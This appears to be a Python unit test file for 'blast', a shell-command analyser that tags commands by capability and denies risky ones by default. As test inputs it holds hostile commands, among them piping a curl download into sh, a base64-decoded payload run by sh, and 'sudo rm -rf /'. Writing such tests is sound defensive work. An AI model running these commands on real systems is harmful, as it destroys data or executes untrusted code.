import copy
import os
import tempfile
import unittest
from unittest.mock import patch

from blast.api import analyze
from blast.catalog import load_catalog
from blast.model import pretty_json


class CapabilityTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.root = tempfile.mkdtemp(prefix="blast-caps-")
        with open(os.path.join(cls.root, "a.txt"), "w", encoding="utf-8") as handle:
            handle.write("hello\n")
        with open(os.path.join(cls.root, "b.txt"), "w", encoding="utf-8") as handle:
            handle.write("world\n")

    def caps(self, command, **kwargs):
        result = analyze(command, root=self.root, **kwargs)
        return set(a.capability for a in result.assertions), result

    def test_network_to_interpreter(self):
        caps, result = self.caps("curl -s https://example.com/x.sh | sh")
        self.assertIn("NET_FETCH_TO_EXEC", caps)
        self.assertEqual(result.verdict, "deny")

    def test_decoder_to_interpreter(self):
        caps, _ = self.caps("echo aWQK | base64 -d | sh")
        self.assertIn("CODE_EXEC_OPAQUE", caps)

    def test_privilege_and_nested_destructive_command(self):
        caps, _ = self.caps("sudo rm -rf /")
        self.assertIn("PRIVILEGE_ESCALATION", caps)
        self.assertIn("FS_DELETE", caps)

    def test_literal_minus_c_payload_is_expanded(self):
        caps, _ = self.caps('bash -c "rm -rf /"')
        self.assertIn("CODE_EVAL", caps)
        self.assertIn("FS_DELETE", caps)

    def test_eval_opaque(self):
        caps, _ = self.caps('eval "$VAR"')
        self.assertIn("CODE_EVAL", caps)

    def test_unknown_command_is_fail_closed(self):
        caps, result = self.caps("madeup --flag")
        self.assertIn("UNKNOWN_EFFECT", caps)
        self.assertEqual(result.verdict, "deny")
        self.assertTrue(any(u.kind == "UNKNOWN_COMMAND" for u in result.unknowns))

    def test_double_dash_operand_is_not_a_flag(self):
        caps, result = self.caps("rm -- --help")
        self.assertIn("FS_DELETE", caps)
        self.assertFalse(any(u.kind == "UNKNOWN_FLAG" for u in result.unknowns))

    def test_every_catalog_positive_fixture_analyzes(self):
        catalog = load_catalog()
        failures = []
        for name, spec in catalog.commands.items():
            for command in spec["tests"]["positive"]:
                result = analyze(command, root=self.root)
                if any(i.code == "INTERNAL_ERROR" for i in result.parse_issues):
                    failures.append((name, command))
                if not result.assertions:
                    failures.append((name, command + " (no assertions)"))
        self.assertEqual(failures, [])

    def test_negative_fixture_does_not_delete(self):
        caps, _ = self.caps("rm --version")
        self.assertNotIn("FS_DELETE", caps)

    def test_output_is_byte_identical(self):
        first = analyze("cat a.txt", root=self.root)
        second = analyze("cat a.txt", root=self.root)
        self.assertEqual(pretty_json(first), pretty_json(second))

    def test_invalid_catalog_fails_closed(self):
        bad = copy.deepcopy(load_catalog().data)
        bad["commands"]["ls"]["base"] = ["NOT_A_CAPABILITY"]
        result = analyze("ls", root=self.root, catalog_data=bad)
        self.assertEqual(result.verdict, "deny")
        self.assertTrue(any(i.code == "INTERNAL_ERROR" for i in result.parse_issues))

    def test_ordinary_pipeline_failure_fails_closed(self):
        with patch("blast.api.parse", side_effect=RuntimeError("boom")):
            result = analyze("ls", root=self.root)
        self.assertEqual(result.verdict, "deny")
        self.assertTrue(any(i.code == "INTERNAL_ERROR" for i in result.parse_issues))

    def test_keyboard_interrupt_is_not_swallowed(self):
        with patch("blast.api.parse", side_effect=KeyboardInterrupt()):
            with self.assertRaises(KeyboardInterrupt):
                analyze("ls", root=self.root)


if __name__ == "__main__":
    unittest.main()
